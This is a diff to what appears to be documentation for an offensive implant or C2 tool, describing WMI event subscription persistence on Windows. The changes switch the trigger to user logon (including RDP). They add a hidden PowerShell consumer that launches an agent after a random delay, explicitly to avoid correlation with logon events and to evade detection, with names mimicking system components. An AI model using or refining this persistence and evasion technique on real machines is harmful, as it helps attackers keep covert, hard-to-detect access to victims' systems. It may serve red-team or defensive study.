@@ -109,8 +109,9 @@ Multiple persistence methods implemented, from simple to APT-like:
 **Characteristics:**
 - Uses Windows Management Instrumentation
 - Creates event filter + consumer + binding
-- Triggers 1-5 minutes after system boot (when SystemUpTime is between 60-300 seconds)
+- Triggers on user logon (interactive or RDP) with a random delay of 2-5 minutes
 - Very stealthy, hard to detect without specialized tools
+- Random delay avoids correlation with boot/logon events
 - Preferred method for advanced threats
 - Names mimicked from system components:
   - "BfeOnServiceStateChange"
@@ -119,14 +120,17 @@ Multiple persistence methods implemented, from simple to APT-like:
 
 **Implementation:**
 ```powershell
-# Event Filter: Trigger when system uptime is between 60-300 seconds (after boot)
-$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 
-          WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' 
-          AND TargetInstance.SystemUpTime >= 60 
-          AND TargetInstance.SystemUpTime <= 300"
+# Event Filter: Trigger when a user logs in (interactive or RDP)
+# LogonType 2 = Interactive (local console)
+# LogonType 10 = RemoteInteractive (RDP)
+# WITHIN 60 = Poll every 60 seconds (efficient for infrequent logon events)
+$Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 
+          WHERE TargetInstance ISA 'Win32_LogonSession' 
+          AND (TargetInstance.LogonType = 2 OR TargetInstance.LogonType = 10)"
 
-# Consumer: Execute agent binary via cmd.exe
-CommandLineEventConsumer -> cmd.exe /c start /min "" "path\to\agent.exe"
+# Consumer: Execute agent with random delay (2-5 minutes) for stealth
+# The delay prevents correlation with logon events
+CommandLineEventConsumer -> powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds <120-300>; Start-Process -WindowStyle Hidden -FilePath 'path\to\agent.exe'"
 
 # Binding: Link filter to consumer
 ```
